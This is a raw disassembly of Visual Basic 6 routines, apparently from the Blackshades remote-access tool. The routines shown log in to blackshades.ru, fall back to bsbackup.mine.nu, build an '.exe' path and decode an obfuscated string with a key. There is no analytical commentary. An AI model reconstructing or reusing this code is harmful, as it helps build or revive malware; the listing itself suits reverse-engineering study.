008143CA: push 00000010h
008143CC: pop eax
008143CD: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008143D2: lea esi, var_3C
008143D5: mov edi, esp
008143D7: movsd 
008143D8: movsd 
008143D9: movsd 
008143DA: movsd 
008143DB: push 0044D754h ; Auto
008143E0: push 0044D744h ; Login
008143E5: mov edx, var_5C
008143E8: lea ecx, var_20
008143EB: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008143F0: push eax
008143F1: call 0041085Ch ; GetSetting(arg_1,arg_2,arg_3,arg_4)
008143F6: mov edx, eax
008143F8: lea ecx, var_24
008143FB: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00814400: push eax
00814401: push 00442938h
00814406: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0081440B: neg eax
0081440D: sbb eax, eax
0081440F: inc eax
00814410: neg eax
00814412: mov var_44, ax
00814416: lea eax, var_28
00814419: push eax
0081441A: lea eax, var_24
0081441D: push eax
0081441E: lea eax, var_20
00814421: push eax
00814422: lea eax, var_1C
00814425: push eax
00814426: lea eax, var_18
00814429: push eax
0081442A: push 00000005h
0081442C: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00814431: add esp, 00000018h
00814434: movsx eax, word ptr var_44
00814438: test eax, eax
0081443A: jz 0081452Ah
00814440: mov eax, [ebp+08h]
00814443: mov eax, [eax]
00814445: push [ebp+08h]
00814448: call [eax+00000304h]
0081444E: push eax
0081444F: lea eax, var_2C
00814452: push eax
00814453: call 00410A84h ; Set (object)
00814458: mov var_44, eax
0081445B: push 00000001h
0081445D: mov eax, var_44
00814460: mov eax, [eax]
00814462: push var_44
00814465: call [eax+000000E4h]
0081446B: fclex 
0081446D: mov var_48, eax
00814470: cmp var_48, 00000000h
00814474: jnl 814490h
00814476: push 000000E4h
0081447B: push 00440DF8h
00814480: push var_44
00814483: push var_48
00814486: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0081448B: mov var_6C, eax
0081448E: jmp 814494h
00814490: and var_6C, 00000000h
00814494: lea ecx, var_2C
00814497: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0081449C: mov eax, [ebp+08h]
0081449F: mov eax, [eax]
008144A1: push [ebp+08h]
008144A4: call [eax+0000031Ch]
008144AA: push eax
008144AB: lea eax, var_2C
008144AE: push eax
008144AF: call 00410A84h ; Set (object)
008144B4: mov var_44, eax
008144B7: push 00453A4Ch ; Status: Logging in...
008144BC: mov eax, var_44
008144BF: mov eax, [eax]
008144C1: push var_44
008144C4: call [eax+54h]
008144C7: fclex 
008144C9: mov var_48, eax
008144CC: cmp var_48, 00000000h
008144D0: jnl 8144E9h
008144D2: push 00000054h
008144D4: push 004425E4h
008144D9: push var_44
008144DC: push var_48
008144DF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008144E4: mov var_70, eax
008144E7: jmp 8144EDh
008144E9: and var_70, 00000000h
008144ED: lea ecx, var_2C
008144F0: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008144F5: mov eax, [ebp+08h]
008144F8: mov eax, [eax]
008144FA: push [ebp+08h]
008144FD: call [eax+00000734h]
00814503: mov var_44, eax
00814506: cmp var_44, 00000000h
0081450A: jnl 814526h
0081450C: push 00000734h
00814511: push 0044391Ch
00814516: push [ebp+08h]
00814519: push var_44
0081451C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00814521: mov var_74, eax
00814524: jmp 81452Ah
00814526: and var_74, 00000000h
0081452A: mov eax, [ebp+08h]
0081452D: mov eax, [eax]
0081452F: push [ebp+08h]
00814532: call [eax+00000318h]
00814538: push eax
00814539: lea eax, var_2C
0081453C: push eax
0081453D: call 00410A84h ; Set (object)
00814542: mov var_44, eax
00814545: push 00000000h
00814547: mov eax, var_44
0081454A: mov eax, [eax]
0081454C: push var_44
0081454F: call [eax+5Ch]
00814552: fclex 
00814554: mov var_48, eax
00814557: cmp var_48, 00000000h
0081455B: jnl 814574h
0081455D: push 0000005Ch
0081455F: push 00447A20h
00814564: push var_44
00814567: push var_48
0081456A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0081456F: mov var_78, eax
00814572: jmp 814578h
00814574: and var_78, 00000000h
00814578: lea ecx, var_2C
0081457B: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00814580: mov var_04, 00000000h
00814587: push 008145B6h
0081458C: jmp 8145B5h
0081458E: lea eax, var_28
00814591: push eax
00814592: lea eax, var_24
00814595: push eax
00814596: lea eax, var_20
00814599: push eax
0081459A: lea eax, var_1C
0081459D: push eax
0081459E: lea eax, var_18
008145A1: push eax
008145A2: push 00000005h
008145A4: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008145A9: add esp, 00000018h
008145AC: lea ecx, var_2C
008145AF: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008145B4: ret 
End Sub

Private sub cmdLogin__811E6A
00811E6A: push ebp
00811E6B: mov ebp, esp
00811E6D: sub esp, 0000000Ch
00811E70: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00811E75: mov eax, fs:[00h]
00811E7B: push eax
00811E7C: mov fs:[00000000h], esp
00811E83: mov eax, 000000B8h
00811E88: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00811E8D: push ebx
00811E8E: push esi
00811E8F: push edi
00811E90: mov var_0C, esp
00811E93: mov var_08, 0040A948h
00811E9A: mov eax, [ebp+08h]
00811E9D: and eax, 00000001h
00811EA0: mov var_04, eax
00811EA3: mov eax, [ebp+08h]
00811EA6: and al, FEh
00811EA8: mov [ebp+08h], eax
00811EAB: mov eax, [ebp+08h]
00811EAE: mov eax, [eax]
00811EB0: push [ebp+08h]
00811EB3: call [eax+04h]
00811EB6: mov eax, [ebp+08h]
00811EB9: cmp word ptr [eax+38h], FFFFh
00811EBE: jnz 811EC5h
00811EC0: jmp 0081246Dh
00811EC5: mov eax, [ebp+08h]
00811EC8: or word ptr [eax+38h], FFFFh
00811ECD: and var_68, 00000000h
00811ED1: mov var_70, 0000000Bh
00811ED8: push 00000010h
00811EDA: pop eax
00811EDB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00811EE0: lea esi, var_70
00811EE3: mov edi, esp
00811EE5: movsd 
00811EE6: movsd 
00811EE7: movsd 
00811EE8: movsd 
00811EE9: push 8001000Dh
00811EEE: mov eax, [ebp+08h]
00811EF1: mov eax, [eax]
00811EF3: push [ebp+08h]
00811EF6: call [eax+00000338h]
00811EFC: push eax
00811EFD: lea eax, var_20
00811F00: push eax
00811F01: call 00410A84h ; Set (object)
00811F06: push eax
00811F07: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
00811F0C: lea ecx, var_20
00811F0F: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00811F14: mov eax, [ebp+08h]
00811F17: mov eax, [eax]
00811F19: push [ebp+08h]
00811F1C: call [eax+00000308h]
00811F22: push eax
00811F23: lea eax, var_20
00811F26: push eax
00811F27: call 00410A84h ; Set (object)
00811F2C: mov var_000000A4, eax
00811F32: lea eax, var_1C
00811F35: push eax
00811F36: mov eax, var_000000A4
00811F3C: mov eax, [eax]
00811F3E: push var_000000A4
00811F44: call [eax+000000A0h]
00811F4A: fclex 
00811F4C: mov var_000000A8, eax
00811F52: cmp var_000000A8, 00000000h
00811F59: jnl 811F7Eh
00811F5B: push 000000A0h
00811F60: push 00440E08h
00811F65: push var_000000A4
00811F6B: push var_000000A8
00811F71: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00811F76: mov var_000000B8, eax
00811F7C: jmp 811F85h
00811F7E: and var_000000B8, 00000000h
00811F85: mov edx, var_1C
00811F88: mov ecx, 008F2044h
00811F8D: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00811F92: lea ecx, var_1C
00811F95: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00811F9A: lea ecx, var_20
00811F9D: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00811FA2: nop 
00811FA3: nop 
00811FA4: nop 
00811FA5: nop 
00811FA6: nop 
00811FA7: mov eax, eax
00811FA9: mov ecx, ecx
00811FAB: mov edi, edi
00811FAD: mov eax, eax
00811FAF: mov edx, edx
00811FB1: mov eax, eax
00811FB3: nop 
00811FB4: inc eax
00811FB5: dec eax
00811FB6: inc eax
00811FB7: dec eax
00811FB8: lea ecx, var_1C
00811FBB: inc eax
00811FBC: dec eax
00811FBD: inc eax
00811FBE: dec eax
00811FBF: nop 
00811FC0: mov eax, [ebp+08h]
00811FC3: mov eax, [eax]
00811FC5: push [ebp+08h]
00811FC8: call [eax+0000031Ch]
00811FCE: push eax
00811FCF: lea eax, var_20
00811FD2: push eax
00811FD3: call 00410A84h ; Set (object)
00811FD8: mov var_000000A4, eax
00811FDE: push 00453754h ; Status: Connecting to server...
00811FE3: mov eax, var_000000A4
00811FE9: mov eax, [eax]
00811FEB: push var_000000A4
00811FF1: call [eax+54h]
00811FF4: fclex 
00811FF6: mov var_000000A8, eax
00811FFC: cmp var_000000A8, 00000000h
00812003: jnl 812025h
00812005: push 00000054h
00812007: push 004425E4h
0081200C: push var_000000A4
00812012: push var_000000A8
00812018: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0081201D: mov var_000000BC, eax
00812023: jmp 81202Ch
00812025: and var_000000BC, 00000000h
0081202C: lea ecx, var_20
0081202F: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00812034: mov edx, 0043D3C4h ; blackshades.ru
00812039: lea ecx, var_18
0081203C: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00812041: push 00000000h
00812043: push 00000046h
00812045: mov eax, [ebp+08h]
00812048: mov eax, [eax]
0081204A: push [ebp+08h]
0081204D: call [eax+00000330h]
00812053: push eax
00812054: lea eax, var_20
00812057: push eax
00812058: call 00410A84h ; Set (object)
0081205D: push eax
0081205E: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00812063: add esp, 0000000Ch
00812066: lea ecx, var_20
00812069: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0081206E: mov eax, [ebp+08h]
00812071: mov eax, [eax]
00812073: push [ebp+08h]
00812076: call [eax+0000030Ch]
0081207C: push eax
0081207D: lea eax, var_20
00812080: push eax
00812081: call 00410A84h ; Set (object)
00812086: mov var_000000A4, eax
0081208C: push 00442938h
00812091: mov eax, var_000000A4
00812097: mov eax, [eax]
00812099: push var_000000A4
0081209F: call [eax+74h]
008120A2: fclex 
008120A4: mov var_000000A8, eax
008120AA: cmp var_000000A8, 00000000h
008120B1: jnl 8120D3h
008120B3: push 00000074h
008120B5: push 00447A20h
008120BA: push var_000000A4
008120C0: push var_000000A8
008120C6: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008120CB: mov var_000000C0, eax
008120D1: jmp 8120DAh
008120D3: and var_000000C0, 00000000h
008120DA: lea ecx, var_20
008120DD: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008120E2: mov eax, [ebp+08h]
008120E5: mov eax, [eax]
008120E7: push [ebp+08h]
008120EA: call [eax+0000030Ch]
008120F0: push eax
008120F1: lea eax, var_20
008120F4: push eax
008120F5: call 00410A84h ; Set (object)
008120FA: mov var_000000A4, eax
00812100: push FFFFFFFFh
00812102: mov eax, var_000000A4
00812108: mov eax, [eax]
0081210A: push var_000000A4
00812110: call [eax+5Ch]
00812113: fclex 
00812115: mov var_000000A8, eax
0081211B: cmp var_000000A8, 00000000h
00812122: jnl 812144h
00812124: push 0000005Ch
00812126: push 00447A20h
0081212B: push var_000000A4
00812131: push var_000000A8
00812137: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0081213C: mov var_000000C4, eax
00812142: jmp 81214Bh
00812144: and var_000000C4, 00000000h
0081214B: lea ecx, var_20
0081214E: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00812153: push 00000000h
00812155: push 00000008h
00812157: mov eax, [ebp+08h]
0081215A: mov eax, [eax]
0081215C: push [ebp+08h]
0081215F: call [eax+00000330h]
00812165: push eax
00812166: lea eax, var_20
00812169: push eax
0081216A: call 00410A84h ; Set (object)
0081216F: push eax
00812170: lea eax, var_30
00812173: push eax
00812174: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00812179: add esp, 00000010h
0081217C: push eax
0081217D: call 004109D0h ; msvbvm60.dll.__vbaI2Var
00812182: movsx eax, ax
00812185: sub eax, 00000006h
00812188: neg eax
0081218A: sbb eax, eax
0081218C: inc eax
0081218D: neg eax
0081218F: not ax
00812192: mov var_000000A4, ax
00812199: lea ecx, var_20
0081219C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008121A1: lea ecx, var_30
008121A4: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008121A9: movsx eax, word ptr var_000000A4
008121B0: test eax, eax
008121B2: jz 00812258h
008121B8: push 00000000h
008121BA: push 00000046h
008121BC: mov eax, [ebp+08h]
008121BF: mov eax, [eax]
008121C1: push [ebp+08h]
008121C4: call [eax+00000330h]
008121CA: push eax
008121CB: lea eax, var_20
008121CE: push eax
008121CF: call 00410A84h ; Set (object)
008121D4: push eax
008121D5: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008121DA: add esp, 0000000Ch
008121DD: lea ecx, var_20
008121E0: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008121E5: mov eax, var_18
008121E8: mov var_68, eax
008121EB: mov var_70, 00000008h
008121F2: mov var_00000088, 0000201Ah
008121FC: mov var_00000090, 00000002h
00812206: push 00000010h
00812208: pop eax
00812209: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0081220E: lea esi, var_70
00812211: mov edi, esp
00812213: movsd 
00812214: movsd 
00812215: movsd 
00812216: movsd 
00812217: push 00000010h
00812219: pop eax
0081221A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0081221F: lea esi, var_00000090
00812225: mov edi, esp
00812227: movsd 
00812228: movsd 
00812229: movsd 
0081222A: movsd 
0081222B: push 00000002h
0081222D: push 00000040h
0081222F: mov eax, [ebp+08h]
00812232: mov eax, [eax]
00812234: push [ebp+08h]
00812237: call [eax+00000330h]
0081223D: push eax
0081223E: lea eax, var_20
00812241: push eax
00812242: call 00410A84h ; Set (object)
00812247: push eax
00812248: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0081224D: add esp, 0000002Ch
00812250: lea ecx, var_20
00812253: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00812258: mov eax, [ebp+08h]
0081225B: mov eax, [eax]
0081225D: push [ebp+08h]
00812260: call [eax+0000030Ch]
00812266: push eax
00812267: lea eax, var_20
0081226A: push eax
0081226B: call 00410A84h ; Set (object)
00812270: mov var_000000A4, eax
00812276: lea eax, var_1C
00812279: push eax
0081227A: mov eax, var_000000A4
00812280: mov eax, [eax]
00812282: push var_000000A4
00812288: call [eax+70h]
0081228B: fclex 
0081228D: mov var_000000A8, eax
00812293: cmp var_000000A8, 00000000h
0081229A: jnl 8122BCh
0081229C: push 00000070h
0081229E: push 00447A20h
008122A3: push var_000000A4
008122A9: push var_000000A8
008122AF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008122B4: mov var_000000C8, eax
008122BA: jmp 8122C3h
008122BC: and var_000000C8, 00000000h
008122C3: push var_1C
008122C6: push 00442938h
008122CB: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
008122D0: neg eax
008122D2: sbb eax, eax
008122D4: inc eax
008122D5: neg eax
008122D7: mov var_000000AC, ax
008122DE: lea ecx, var_1C
008122E1: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008122E6: lea ecx, var_20
008122E9: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008122EE: movsx eax, word ptr var_000000AC
008122F5: test eax, eax
008122F7: jz 812303h
008122F9: call 0041096Ah ; DoEvents
008122FE: jmp 00812258h
00812303: mov eax, [ebp+08h]
00812306: mov eax, [eax]
00812308: push [ebp+08h]
0081230B: call [eax+0000030Ch]
00812311: push eax
00812312: lea eax, var_20
00812315: push eax
00812316: call 00410A84h ; Set (object)
0081231B: mov var_000000A4, eax
00812321: lea eax, var_1C
00812324: push eax
00812325: mov eax, var_000000A4
0081232B: mov eax, [eax]
0081232D: push var_000000A4
00812333: call [eax+70h]
00812336: fclex 
00812338: mov var_000000A8, eax
0081233E: cmp var_000000A8, 00000000h
00812345: jnl 812367h
00812347: push 00000070h
00812349: push 00447A20h
0081234E: push var_000000A4
00812354: push var_000000A8
0081235A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0081235F: mov var_000000CC, eax
00812365: jmp 81236Eh
00812367: and var_000000CC, 00000000h
0081236E: push var_1C
00812371: push 00453798h ; ok
00812376: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0081237B: neg eax
0081237D: sbb eax, eax
0081237F: inc eax
00812380: neg eax
00812382: not ax
00812385: mov var_000000AC, ax
0081238C: lea ecx, var_1C
0081238F: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00812394: lea ecx, var_20
00812397: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0081239C: movsx eax, word ptr var_000000AC
008123A3: test eax, eax
008123A5: jz 00812447h
008123AB: push var_18
008123AE: push 0043D3E8h ; bsbackup.mine.nu
008123B3: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
008123B8: test eax, eax
008123BA: jnz 812435h
008123BC: mov var_58, 80020004h
008123C3: mov var_60, 0000000Ah
008123CA: mov var_48, 80020004h
008123D1: mov var_50, 0000000Ah
008123D8: mov var_38, 80020004h
008123DF: mov var_40, 0000000Ah
008123E6: mov var_68, 004537A4h ; Communication with server failed! Please try again later.
008123ED: mov var_70, 00000008h
008123F4: lea edx, var_70
008123F7: lea ecx, var_30
008123FA: call 004109E2h ; msvbvm60.dll.__vbaVarDup
008123FF: lea eax, var_60
00812402: push eax
00812403: lea eax, var_50
00812406: push eax
00812407: lea eax, var_40
0081240A: push eax
0081240B: push 00000010h
0081240D: lea eax, var_30
00812410: push eax
00812411: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
00812416: lea eax, var_60
00812419: push eax
0081241A: lea eax, var_50
0081241D: push eax
0081241E: lea eax, var_40
00812421: push eax
00812422: lea eax, var_30
00812425: push eax
00812426: push 00000004h
00812428: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0081242D: add esp, 00000014h
00812430: call 00410874h ; End
00812435: mov edx, 0043D3E8h ; bsbackup.mine.nu
0081243A: lea ecx, var_18
0081243D: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00812442: jmp 00812041h
00812447: nop 
00812448: nop 
00812449: nop 
0081244A: nop 
0081244B: nop 
0081244C: mov edx, edx
0081244E: mov eax, eax
00812450: mov ebx, ebx
00812452: mov ecx, ecx
00812454: mov eax, eax
00812456: mov eax, eax
00812458: nop 
00812459: inc eax
0081245A: dec eax
0081245B: inc eax
0081245C: dec eax
0081245D: lea ecx, var_1C
00812460: inc eax
00812461: dec eax
00812462: inc eax
00812463: dec eax
00812464: nop 
00812465: mov eax, [ebp+08h]
00812468: and word ptr [eax+38h], 0000h
0081246D: mov var_04, 00000000h
00812474: push 008124AFh
00812479: jmp 8124A6h
0081247B: lea ecx, var_1C
0081247E: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00812483: lea ecx, var_20
00812486: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0081248B: lea eax, var_60
0081248E: push eax
0081248F: lea eax, var_50
00812492: push eax
00812493: lea eax, var_40
00812496: push eax
00812497: lea eax, var_30
0081249A: push eax
0081249B: push 00000004h
0081249D: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008124A2: add esp, 00000014h
008124A5: ret 
End Sub

Private sub Timer3__8145D5
008145D5: push ebp
008145D6: mov ebp, esp
008145D8: sub esp, 00000018h
008145DB: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008145E0: mov eax, fs:[00h]
008145E6: push eax
008145E7: mov fs:[00000000h], esp
008145EE: mov eax, 000000BCh
008145F3: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008145F8: push ebx
008145F9: push esi
008145FA: push edi
008145FB: mov var_18, esp
008145FE: mov var_14, 0040AB08h
00814605: mov eax, [ebp+08h]
00814608: and eax, 00000001h
0081460B: mov var_10, eax
0081460E: mov eax, [ebp+08h]
00814611: and al, FEh
00814613: mov [ebp+08h], eax
00814616: mov var_0C, 00000000h
0081461D: mov eax, [ebp+08h]
00814620: mov eax, [eax]
00814622: push [ebp+08h]
00814625: call [eax+04h]
00814628: mov var_04, 00000001h
0081462F: mov var_04, 00000002h
00814636: push FFFFFFFFh
00814638: call 00410A60h ; On Error ...
0081463D: mov var_04, 00000003h
00814644: cmp [008F529Ch], 00000000h
0081464B: jnz 814668h
0081464D: push 008F529Ch
00814652: push 00440F2Ch
00814657: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0081465C: mov var_000000BC, 008F529Ch
00814666: jmp 814672h
00814668: mov var_000000BC, 008F529Ch
00814672: mov eax, var_000000BC
00814678: mov eax, [eax]
0081467A: mov var_00000084, eax
00814680: lea eax, var_58
00814683: push eax
00814684: mov eax, var_00000084
0081468A: mov eax, [eax]
0081468C: push var_00000084
00814692: call [eax+14h]
00814695: fclex 
00814697: mov var_00000088, eax
0081469D: cmp var_00000088, 00000000h
008146A4: jnl 8146C6h
008146A6: push 00000014h
008146A8: push 00440F1Ch
008146AD: push var_00000084
008146B3: push var_00000088
008146B9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008146BE: mov var_000000C0, eax
008146C4: jmp 8146CDh
008146C6: and var_000000C0, 00000000h
008146CD: mov eax, var_58
008146D0: mov var_0000008C, eax
008146D6: lea eax, var_40
008146D9: push eax
008146DA: mov eax, var_0000008C
008146E0: mov eax, [eax]
008146E2: push var_0000008C
008146E8: call [eax+50h]
008146EB: fclex 
008146ED: mov var_00000090, eax
008146F3: cmp var_00000090, 00000000h
008146FA: jnl 81471Ch
008146FC: push 00000050h
008146FE: push 00440F3Ch
00814703: push var_0000008C
00814709: push var_00000090
0081470F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00814714: mov var_000000C4, eax
0081471A: jmp 814723h
0081471C: and var_000000C4, 00000000h
00814723: cmp [008F529Ch], 00000000h
0081472A: jnz 814747h
0081472C: push 008F529Ch
00814731: push 00440F2Ch
00814736: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0081473B: mov var_000000C8, 008F529Ch
00814745: jmp 814751h
00814747: mov var_000000C8, 008F529Ch
00814751: mov eax, var_000000C8
00814757: mov eax, [eax]
00814759: mov var_00000094, eax
0081475F: lea eax, var_5C
00814762: push eax
00814763: mov eax, var_00000094
00814769: mov eax, [eax]
0081476B: push var_00000094
00814771: call [eax+14h]
00814774: fclex 
00814776: mov var_00000098, eax
0081477C: cmp var_00000098, 00000000h
00814783: jnl 8147A5h
00814785: push 00000014h
00814787: push 00440F1Ch
0081478C: push var_00000094
00814792: push var_00000098
00814798: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0081479D: mov var_000000CC, eax
008147A3: jmp 8147ACh
008147A5: and var_000000CC, 00000000h
008147AC: mov eax, var_5C
008147AF: mov var_0000009C, eax
008147B5: lea eax, var_44
008147B8: push eax
008147B9: mov eax, var_0000009C
008147BF: mov eax, [eax]
008147C1: push var_0000009C
008147C7: call [eax+58h]
008147CA: fclex 
008147CC: mov var_000000A0, eax
008147D2: cmp var_000000A0, 00000000h
008147D9: jnl 8147FBh
008147DB: push 00000058h
008147DD: push 00440F3Ch
008147E2: push var_0000009C
008147E8: push var_000000A0
008147EE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008147F3: mov var_000000D0, eax
008147F9: jmp 814802h
008147FB: and var_000000D0, 00000000h
00814802: push var_40
00814805: push 00441B28h
0081480A: call 00410A18h ; &
0081480F: mov edx, eax
00814811: lea ecx, var_48
00814814: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00814819: push eax
0081481A: push var_44
0081481D: call 00410A18h ; &
00814822: mov edx, eax
00814824: lea ecx, var_4C
00814827: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0081482C: push eax
0081482D: push 00441A70h ; .exe
00814832: call 00410A18h ; &
00814837: mov edx, eax
00814839: lea ecx, var_50
0081483C: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00814841: push eax
00814842: call 007CCF71h
00814847: mov var_64, eax
0081484A: mov var_6C, 00002011h
00814851: lea eax, var_6C
00814854: push eax
00814855: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0081485A: mov edx, eax
0081485C: lea ecx, var_54
0081485F: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00814864: push eax
00814865: call 00872A51h
0081486A: mov var_74, eax
0081486D: mov var_7C, 00000008h
00814874: lea edx, var_7C
00814877: lea ecx, var_38
0081487A: call 00410922h ; msvbvm60.dll.__vbaVarMove
0081487F: lea eax, var_54
00814882: push eax
00814883: lea eax, var_50
00814886: push eax
00814887: lea eax, var_4C
0081488A: push eax
0081488B: lea eax, var_44
0081488E: push eax
0081488F: lea eax, var_48
00814892: push eax
00814893: lea eax, var_40
00814896: push eax
00814897: push 00000006h
00814899: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0081489E: add esp, 0000001Ch
008148A1: lea eax, var_5C
008148A4: push eax
008148A5: lea eax, var_58
008148A8: push eax
008148A9: push 00000002h
008148AB: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008148B0: add esp, 0000000Ch
008148B3: lea ecx, var_6C
008148B6: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008148BB: mov var_04, 00000004h
008148C2: cmp [008F529Ch], 00000000h
008148C9: jnz 8148E6h
008148CB: push 008F529Ch
008148D0: push 00440F2Ch
008148D5: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008148DA: mov var_000000D4, 008F529Ch
008148E4: jmp 8148F0h
008148E6: mov var_000000D4, 008F529Ch
008148F0: mov eax, var_000000D4
008148F6: mov eax, [eax]
008148F8: mov var_00000084, eax
008148FE: lea eax, var_58
00814901: push eax
00814902: mov eax, var_00000084
00814908: mov eax, [eax]
0081490A: push var_00000084
00814910: call [eax+14h]
00814913: fclex 
00814915: mov var_00000088, eax
0081491B: cmp var_00000088, 00000000h
00814922: jnl 814944h
00814924: push 00000014h
00814926: push 00440F1Ch
0081492B: push var_00000084
00814931: push var_00000088
00814937: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0081493C: mov var_000000D8, eax
00814942: jmp 81494Bh
00814944: and var_000000D8, 00000000h
0081494B: mov eax, var_58
0081494E: mov var_0000008C, eax
00814954: lea eax, var_40
00814957: push eax
00814958: mov eax, var_0000008C
0081495E: mov eax, [eax]
00814960: push var_0000008C
00814966: call [eax+50h]
00814969: fclex 
0081496B: mov var_00000090, eax
00814971: cmp var_00000090, 00000000h
00814978: jnl 81499Ah
0081497A: push 00000050h
0081497C: push 00440F3Ch
00814981: push var_0000008C
00814987: push var_00000090
0081498D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00814992: mov var_000000DC, eax
00814998: jmp 8149A1h
0081499A: and var_000000DC, 00000000h
008149A1: and word ptr var_80, 0000h
008149A6: mov edx, 00445AC4h ; frmMain
008149AB: lea ecx, var_48
008149AE: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008149B3: mov edx, 004464ECh ; 2E092C1508320213192C4F00000F
008149B8: lea ecx, var_44
008149BB: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008149C0: push var_40
008149C3: lea eax, var_80
008149C6: push eax
008149C7: lea eax, var_48
008149CA: push eax
008149CB: lea eax, var_44
008149CE: push eax
008149CF: call 007AA622h
008149D4: mov edx, eax
008149D6: lea ecx, var_4C
008149D9: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008149DE: push eax
008149DF: call 00410A18h ; &
008149E4: mov edx, eax
008149E6: lea ecx, var_50
008149E9: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008149EE: push eax
008149EF: call 007A5B65h
008149F4: mov edx, eax
008149F6: lea ecx, var_28
008149F9: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008149FE: lea eax, var_50
00814A01: push eax
00814A02: lea eax, var_4C
00814A05: push eax
00814A06: lea eax, var_40
00814A09: push eax
00814A0A: lea eax, var_48
00814A0D: push eax
00814A0E: lea eax, var_44
00814A11: push eax
00814A12: push 00000005h
00814A14: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00814A19: add esp, 00000018h
00814A1C: lea ecx, var_58
00814A1F: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00814A24: mov var_04, 00000005h
00814A2B: push 0044652Ch ; wAzQ5d
00814A30: push var_28
00814A33: call 007AAA41h
00814A38: mov edx, eax
00814A3A: lea ecx, var_24
00814A3D: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00814A42: mov var_10, 00000000h
00814A49: push 00814AC9h
00814A4E: jmp 814A97h
00814A50: lea eax, var_54
00814A53: push eax
00814A54: lea eax, var_50
00814A57: push eax
00814A58: lea eax, var_4C
00814A5B: push eax
00814A5C: lea eax, var_48
00814A5F: push eax
00814A60: lea eax, var_44
00814A63: push eax
00814A64: lea eax, var_40
00814A67: push eax
00814A68: push 00000006h
00814A6A: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00814A6F: add esp, 0000001Ch
00814A72: lea eax, var_5C
00814A75: push eax
00814A76: lea eax, var_58
00814A79: push eax
00814A7A: push 00000002h
00814A7C: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
